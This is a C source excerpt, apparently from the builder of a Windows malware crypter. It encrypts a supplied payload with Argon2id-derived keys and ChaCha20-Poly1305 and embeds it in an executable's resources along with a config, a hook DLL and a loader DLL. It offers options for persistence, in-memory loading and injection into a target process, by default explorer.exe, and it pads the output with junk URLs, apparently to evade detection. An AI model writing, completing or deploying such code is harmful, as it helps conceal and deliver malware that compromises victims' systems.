...
// PayloadConfig shared type (moved to file scope so it is visible to all
// functions)
typedef struct {
  ...
  char
      inject_target[260]; // Target process for injection (e.g., "explorer.exe")
...
int main(int argc, char *argv[]) {
  if (argc < 7 || argc > 8) {
    fprintf(stderr,
            "Usage: %s <payload_path> <output_path> <key_hex> <junk_size_mb> "
            "<persistence> <load_in_memory> [inject_target]\n",
            argv[0]);
    return 1;
  }
  ...
  const char *inject_target = (argc >= 8) ? argv[7] : "explorer.exe";

  // Validate key_hex (should be 64 chars for a 32-byte key)
  if (strlen(key_hex) != 64) {
    fprintf(stderr,
            "Error: Key must be a 64-character hex string (32 bytes).\n");
    return 1;
  }
  ...
  if (BCryptGenRandom(NULL, salt, CRYPTO_SALT_LEN,
  ...
  if (crypto_argon2id_derive((const uint8_t *)key_hex, strlen(key_hex), salt,
                             CRYPTO_SALT_LEN, ARGON_T_COST, ARGON_M_COST_KIB,
                             ARGON_PARALLELISM, key32, sizeof(key32)) != 0) {
  ...
  if (crypto_chacha20_poly1305_encrypt(payload_data, (size_t)payload_size,
                                       key32, NULL, 0, &env, ciphertext) != 0) {
  ...
  printf("PayloadConfig size: fixed part=%zu, stored_len=%zu, "
         "plaintext_size=%ld, total=%zu bytes (with header=%zu)\n",
         offsetof(PayloadConfig, payload_data), stored_len, payload_size,
         config_size, blob_size);
  ...
  strncpy(config->inject_target, inject_target, 260);
  config->inject_target[259] = '\0'; // Ensure null termination
  memcpy(config->payload_data, enc_blob, stored_len);
  // No longer needed after copying to config; null it so cleanup doesn't double
  // free
  free(payload_data);
  payload_data = NULL;
  free(enc_blob);
  ...
  if (!hUpdate) {
    fprintf(stderr,
            "Error: BeginUpdateResource for output executable failed: %d\n",
            GetLastError());
    ret = 1;
    goto cleanup;
  }
  ...
  if (load_in_memory) {
    // Step 1: Copy template.dll to payload.dll and embed the PayloadConfig
    // resource
    ...
    if (!UpdateResource(hDllUpdate, "PAYLOAD", "CONFIG",
                        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), config_blob,
                        blob_size)) {
      fprintf(
          stderr,
          "Error: UpdateResource for PayloadConfig in payload.dll failed: %d\n",
          GetLastError());
      ret = 1;
      goto cleanup;
    }
    ...
    // Step 2: Read payload.dll into memory and embed it into the output
    // executable
    ...
    if (!dll_data) {
      fprintf(stderr,
              "Error: Could not allocate memory for payload.dll data.\n");
      ret = 1;
      goto cleanup;
    }
    ...
    if (!UpdateResource(hUpdate, "PAYLOAD", "DLL",
                        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), dll_data,
                        dll_size)) {
    ...
    if (fread(hook_dll_data, 1, hook_dll_size, hook_dll_file) !=
        hook_dll_size) {
    ...
    if (!UpdateResource(hUpdate, "PAYLOAD", "HOOKDLL",
                        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                        hook_dll_data, hook_dll_size)) {
    ...
    if (!UpdateResource(hUpdate, "PAYLOAD", "CONFIG",
                        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), config_blob,
                        blob_size)) {
      fprintf(stderr,
              "Error: UpdateResource for PayloadConfig in output executable "
              "failed: %d\n",
              GetLastError());
      ret = 1;
      goto cleanup;
  ...
  if (junk_data && url_count > 0) {
    if (!UpdateResource(hUpdate, "JUNK", "URLS",
                        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), junk_data,
                        junk_size)) {
    ...
    printf("Embedded %ld junk URLs into %s, total size: %zu bytes\n", url_count,
           output_path, junk_size);
  }

  // Commit the resource changes to the output executable
  if (!EndUpdateResource(hUpdate, FALSE)) {
    fprintf(stderr,
            "Error: EndUpdateResource for output executable failed: %d\n",
            GetLastError());
    ret = 1;
    goto cleanup;
  }
  ...
  // After embedding resources, append any plugins found in the `plugins/`
  // folder as a simple overlay.
  {
    ...
    if (disable_plugins && disable_plugins[0] != '\0') {
      ...
      if (hFind != INVALID_HANDLE_VALUE) {
        ...
        do {
          ...
          if (env_plugin_dir && env_plugin_dir[0] != '\0')
            snprintf(path, PATH_BUF_LEN, "%s\\%s", env_plugin_dir,
                     fd.cFileName);
          else
          ...
          ent->stage = PLUGIN_STAGE_POSTLAUNCH; // default stage when not
                                                // specified by GUI
          ent->order = 0;                       // default order
          // If a metadata file exists (created by GUI), read stage/order
          char meta_path[PATH_BUF_LEN];
          if (env_plugin_dir && env_plugin_dir[0] != '\0')
            snprintf(meta_path, PATH_BUF_LEN, "%s\\%s.meta", env_plugin_dir,
                     fd.cFileName);
          else
        ...
        if (entry_count > 0) {
          ...
          for (size_t i = 0; i < entry_count; i++)
            blobs_size += entries[i].ent.blob_len;
          size_t overlay_size =
              table_size + blobs_size + sizeof(PluginOverlayHeader);
          ...
          if (obuf) {
            ...
            for (size_t i = 0; i < entry_count; i++) {
              ...
              memcpy(ptr, &entries[i].ent, sizeof(PluginEntry));
              ptr += sizeof(PluginEntry);
            ...
            // table_offset stores the distance from the header back to the
            // overlay start i.e., header_pos - overlay_start = table_size +
            // blobs_size
            oh.table_offset = (uint32_t)(table_size + blobs_size);
            oh.plugin_count = (uint32_t)entry_count;
            memcpy(ptr, &oh, sizeof(oh));
            ptr += sizeof(oh);
            ...
            if (outf) {
              ...
              for (size_t pi = 0; pi < entry_count; pi++) {
                printf(" - %s (stage=%u order=%u)\n", entries[pi].ent.id,
                       entries[pi].ent.stage, entries[pi].ent.order);
              }
